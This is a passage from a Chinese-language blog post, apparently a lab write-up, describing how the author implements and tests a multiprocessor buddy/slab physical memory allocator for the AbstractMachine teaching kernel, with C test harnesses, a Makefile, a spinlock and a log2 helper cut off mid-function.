如果此时想要查看多处理器的处理器信息，并切换到指定的处理器上，则在gdb中执行如下调试多线程的命令进行查看<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info threads</span><br><span class="line">(gdb) thread [threadId]</span><br></pre></td></tr></table></figure></p><p>  可以看到，实际上调试多处理器的AbstractMachine<del>并不是</del>很困难。虽然如此，由于本次实验对于不同的workload的性能和准确性都有一定要求，因此构造一个测试框架，进行自动的编译、运行测试和清理是十分有帮助的。</p><ol><li><p>添加条件编译</p><p>为了最小程度的修改源代码，并且在任何时候都可以通过<code>make run</code>或<code>make test=pmm,buddy</code>命令，来编译、运行对应的正常样例和测试样例，我们通过添加条件编译来实现。除此之外，为了适应项目的需要，测试<code>kalloc</code>和<code>kfree</code>在不同workload下的正确性和性能，我们使用宏选择测试的函数，这样子对于新的测试样例，只需要增添宏即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//os.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined TESTpmm</span></span><br><span class="line">  <span class="type">static</span> <span class="type">void</span> <span class="title function_">os_run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test the pmm\n&quot;</span>);</span><br><span class="line">    test_pmm();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">static</span> <span class="type">void</span> <span class="title function_">os_run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World from CPU #%d\n&quot;</span>, cpu_current());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pmm.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined TESTbuddy</span></span><br><span class="line">  <span class="comment">//测试buddys方式</span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">test_pmm</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> CAPACITY (500)</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">array</span>[CAPACITY] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">int</span> array_size[CAPACITY] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (rand() % <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">if</span>(size &lt; CAPACITY) &#123;</span><br><span class="line">            array_size[size] = BUDDY_IDX2CHUNK_SIZE(rand() % buddys_size);</span><br><span class="line">            <span class="built_in">array</span>[size] = (<span class="type">char</span>*)buddys_alloc(array_size[size]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">array</span>[size] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:buddys_alloc(%X) = %X\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)array_size[size], (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line"></span><br><span class="line">              <span class="comment">//填充，方便进行调试</span></span><br><span class="line">              <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123; <span class="built_in">array</span>[size][i] = (<span class="type">char</span>)array_size[size];&#125;</span><br><span class="line">              ++size;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="keyword">if</span>(size) &#123;</span><br><span class="line">            --size;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123;</span><br><span class="line">              panic_on(<span class="built_in">array</span>[size][i] != (<span class="type">char</span>)array_size[size], <span class="string">&quot;corrupted&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            buddys_free((Chunk*)<span class="built_in">array</span>[size]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:buddys_free(%X)\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined TESTslab</span></span><br><span class="line">  <span class="comment">//测试slabs方式</span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">test_pmm</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> CAPACITY (500)</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">array</span>[CAPACITY] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">int</span> array_size[CAPACITY] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (rand() % <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          <span class="keyword">if</span>(size &lt; CAPACITY) &#123;</span><br><span class="line">            array_size[size] = SLAB_IDX2CHUNK_SIZE(rand() % slabs_size);</span><br><span class="line">            <span class="built_in">array</span>[size] = (<span class="type">char</span>*)slabs_alloc(array_size[size]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">array</span>[size] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:slabs_alloc(%X) = %X\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)array_size[size], (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line"></span><br><span class="line">              <span class="comment">//填充，方便进行调试</span></span><br><span class="line">              <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123; <span class="built_in">array</span>[size][i] = (<span class="type">char</span>)array_size[size];&#125;</span><br><span class="line">              ++size;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="keyword">if</span>(size) &#123;</span><br><span class="line">            --size;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123;</span><br><span class="line">              panic_on(<span class="built_in">array</span>[size][i] != (<span class="type">char</span>)array_size[size], <span class="string">&quot;corrupted&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            slabs_free((Chunk*)<span class="built_in">array</span>[size]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:slabs_free(%X)\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">test_pmm</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> CAPACITY (500)</span></span><br><span class="line">    <span class="type">char</span> *<span class="built_in">array</span>[CAPACITY] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="type">int</span> array_size[CAPACITY] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> total = <span class="number">0</span>, counts[<span class="number">3</span>] = &#123;<span class="number">80</span>, <span class="number">19</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">uintptr_t</span> BOUNDARY1 = <span class="number">128</span>, BOUNDARY2 = <span class="number">32</span> KB, BOUNDARY3 = <span class="number">1</span> MB / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (rand() % <span class="number">2</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">           * 为了模拟workload,我们通过rand()来模拟申请的大小</span></span><br><span class="line"><span class="comment">           *</span></span><br><span class="line"><span class="comment">           * 我们以每一轮50次一个统计</span></span><br><span class="line"><span class="comment">           * 则大量、频繁的小内存分配/释放；其中绝大部分不超过 BOUNDARY1 字节， 这里默认80%概率为小内存分配，也就是80轮</span></span><br><span class="line"><span class="comment">           * 较为频繁的，以物理页面大小为单位的分配/释放 (4 KiB)；这里默认19%概率分配，也就是19轮，大小不超过BOUNDARY2</span></span><br><span class="line"><span class="comment">           * 非常罕见的大内存分配，即1轮，大小不超过BOUNDARY3</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          <span class="keyword">if</span>(size &lt; CAPACITY) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> mode = rand() % <span class="number">3</span>; ; mode = (mode + <span class="number">1</span>) % <span class="number">3</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span>(counts[mode]) &#123;</span><br><span class="line">                --counts[mode];</span><br><span class="line">                <span class="keyword">switch</span>(mode) &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    array_size[size] = <span class="number">1</span> + (rand() % BOUNDARY1);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    array_size[size] = PAGESIZE * (<span class="number">1</span> + (rand() % (BOUNDARY2 / PAGESIZE)));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                    array_size[size] = BUDDY_IDX2CHUNK_SIZE(BUDDY_CHUNK_SIZE2IDX(BOUNDARY2) + <span class="number">1</span> + (rand() % (BUDDY_CHUNK_SIZE2IDX(BOUNDARY3) - BUDDY_CHUNK_SIZE2IDX(BOUNDARY2))));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(++total == <span class="number">100</span>) &#123;</span><br><span class="line">              total = <span class="number">0</span>;</span><br><span class="line">              counts[<span class="number">0</span>] = <span class="number">80</span>;</span><br><span class="line">              counts[<span class="number">1</span>] = <span class="number">19</span>;</span><br><span class="line">              counts[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">array</span>[size] = (<span class="type">char</span>*)pmm-&gt;alloc(array_size[size]);</span><br><span class="line"></span><br><span class="line">            panic_on(<span class="built_in">array</span>[size] == <span class="literal">NULL</span>, <span class="string">&quot;not enough space&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:pmm-&gt;alloc(%X) = %X\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)array_size[size], (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//填充，方便进行调试</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123; <span class="built_in">array</span>[size][i] = (<span class="type">char</span>)array_size[size];&#125;</span><br><span class="line">            ++size;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="keyword">if</span>(size) &#123;</span><br><span class="line">            --size;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; array_size[size]; ++i) &#123;</span><br><span class="line">              panic_on(<span class="built_in">array</span>[size][i] != (<span class="type">char</span>)array_size[size], <span class="string">&quot;corrupted&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            pmm-&gt;<span class="built_in">free</span>((Chunk*)<span class="built_in">array</span>[size]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;cpu%d:pmm-&gt;free(%X)\n&quot;</span>, (<span class="type">int</span>)cpu_current(), (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)<span class="built_in">array</span>[size]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></li><li><p>添加编译目标<br>这里为了实现通过make自动编译和执行不同的内核，需要添加编译目标。通过修改<strong>kernel</strong>目录下的相关Makefile实现</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">NAME           := kernel</span><br><span class="line">SRCS           := framework/main.c <span class="variable">$(<span class="built_in">shell</span> find -L ./src/ -name &quot;*.c&quot;)</span></span><br><span class="line">INC_PATH       := <span class="keyword">include</span>/ framework/</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> AM_HOME := <span class="variable">$(PWD)</span>/../abstract-machine</span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(ARCH)</span>,)</span><br><span class="line"><span class="keyword">export</span> ARCH    := x86_64-qemu</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(ARCH)</span>, x86_64-qemu)</span><br><span class="line"><span class="keyword">export</span> QEMU:= qemu-system-x86_64</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">ifeq</span> (<span class="variable">$(ARCH)</span>, x86-qemu)</span><br><span class="line"><span class="keyword">export</span> QEMU := qemu-system-i386</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(smp)</span>,)</span><br><span class="line"><span class="keyword">export</span> smp:= 4</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMA:=,</span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(test)</span>,)</span><br><span class="line"><span class="keyword">export</span> CFLAGS += <span class="variable">$(<span class="built_in">patsubst</span> %,-DTEST%, $(<span class="built_in">subst</span> <span class="variable">$(COMMA)</span>, ,<span class="variable">$(test)</span>)</span>)</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(debug)</span>,)</span><br><span class="line"><span class="keyword">export</span> CFLAGS += <span class="variable">$(<span class="built_in">patsubst</span> %,-DDEBUG%, $(<span class="built_in">subst</span> <span class="variable">$(COMMA)</span>, ,<span class="variable">$(debug)</span>)</span>)</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(rand)</span>,)</span><br><span class="line"><span class="keyword">export</span> CFLAGS += -DRANDOM=<span class="variable">$(<span class="built_in">shell</span> date +%N | head -c 6)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(AM_HOME)</span>/Makefile</span><br><span class="line"><span class="keyword">include</span> ../Makefile.lab</span><br><span class="line"><span class="section">image: git</span></span><br><span class="line"></span><br><span class="line"><span class="section">gdb: image</span></span><br><span class="line"><span class="variable">$(QEMU)</span> -gdb tcp::1737 -S -serial stdio -smp <span class="variable">$(smp)</span> -drive format=raw,file=./build/kernel-<span class="variable">$(ARCH)</span> -no-reboot -no-shutdown</span><br></pre></td></tr></table></figure><p>其中，关于<strong>make</strong>相关的内置函数的用法，可以查看<a href="https://www.gnu.org/savannah-checkouts/gnu/make/manual/make.html">手册</a>获取</p></li><li><p>运行内核<br>如果要运行正常模式下的内核，则只需要设置多处理器个数以及运行环境即可，执行如下样例在本机上模拟四核计算机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make ARCH=native smp=4 run</span><br></pre></td></tr></table></figure><p>如果要运行制定测试的内核，则指定目标<strong>test</strong>的值即可，样例如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span>=pmm,buddy run</span><br></pre></td></tr></table></figure></li></ol><h3 id="实现互斥锁"><a href="#实现互斥锁" class="headerlink" title="实现互斥锁"></a>实现互斥锁</h3><p>  AbstractMachine文档中给出了原子指令<code>int atomic_xchg(volatile int *addr, int newval)</code>，其会原子地交换内存地址中的数值。<br>  为了方便实现，我们需要包装为两种获取锁(阻塞获取和非阻塞获取)和一种释放所的API，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pmm.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">lock_init</span><span class="params">(<span class="type">int</span> *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">atomic_xchg</span>(lock, PMMUNLOCKED);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 阻塞，直到获取锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">lock_acquire</span><span class="params">(<span class="type">int</span> *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="type">atomic_xchg</span>(lock, PMMLOCKED) == PMMLOCKED) &#123;;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 释放获取的锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">lock_release</span><span class="params">(<span class="type">int</span> *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  panic_on(<span class="type">atomic_xchg</span>(lock, PMMUNLOCKED) != PMMLOCKED, <span class="string">&quot;lock is not acquire&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其可以用来确认当前是否获取了锁</span></span><br><span class="line"><span class="comment"> * 或者用来非阻塞的获取锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">lock_try_acquire</span><span class="params">(<span class="type">int</span> *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="type">atomic_xchg</span>(lock, PMMLOCKED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  可以看到，这里实现了一套简易的锁的API</p><h3 id="分配对象结构简述"><a href="#分配对象结构简述" class="headerlink" title="分配对象结构简述"></a>分配对象结构简述</h3><p>  本质上，内存管理是按照一定规则从系统内存上申请内存对象;当释放的时候，再按照一定的规则缓存起来，等待下次申请内存对象时直接使用，而非直接返回给系统，从而提高内存管理的效率和性能。</p><p>  因此，我们需要根据内存申请的特点，构造对应的内存对象数据结构，从而提高内存管理的效率和安全性。根据前面的实验要求和实验指南:一方面，返回的内存地址必须对齐到$2^{i}$;另一方面，请求的内存大小有如下特征:</p><ol><li>大量、频繁的小内存分配和释放;绝大部分不超过128字节;</li><li>较为频繁的，以物理页面大小为单位的分配/释放(4KiB)</li><li>非常罕见的大内存分配</li></ol><p>  为了尽可能的高并发，在内存中构建与处理器等数量的内存管理结构，并以循环链表的形式进行管理——每个处理器在申请内存时，会循环遍历这些内存管理结构，找到一个未上锁的内存管理结构，并完成相关的内存申请。<br>  由于其内存地址需要对齐到$2^{i}$，则我们使用<strong>伙伴算法</strong>;而由于其频繁、大量的进行小内存分配和释放，因此我们使用<strong>slab机制</strong>缓存所有大小相同的内存对象。<br>  <img src="内存数据结构.png" alt="内存数据结构"><br>  <img src="内存初始布局.png" alt="内存初始布局"></p><h3 id="申请大小对齐到-2-i"><a href="#申请大小对齐到-2-i" class="headerlink" title="申请大小对齐到$2^{i}$"></a>申请大小对齐到$2^{i}$</h3><p>  实际上部分CPU提供时间复杂度为$O(1)$的硬件解决方法，但是其没有可移植性。因此我们还是通过二分的软件方法进行实现。<br>  其思路就是通过位运算，其随着位运算的左移个数增加而值减少，是单调的。因此可以通过二分查找，以$O(logn)$的时间复杂度解决<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 计算ceil(log2(n))</span></span><br><span class="line"><span class="comment"> * 0 &lt; n &lt;= 2 ^ (sizeof(uintptr_t) * 8 - 1)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span></span><br><span class="line"><span class="title function_">log_ceil</span><span class="params">(<span class="type">uintptr_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  panic_on(n &lt;= <span class="number">0</span>, <span class="string">&quot;log error n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(n == <span class="number">1</span>) &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> left = <span class="number">0</span>, right = <span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>) * <span class="number">8</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 对于下面的二分法来说</span></span><br><span class="line"><span class="comment">   * 对于所有的n，其计算的是满足2 ^ (a - 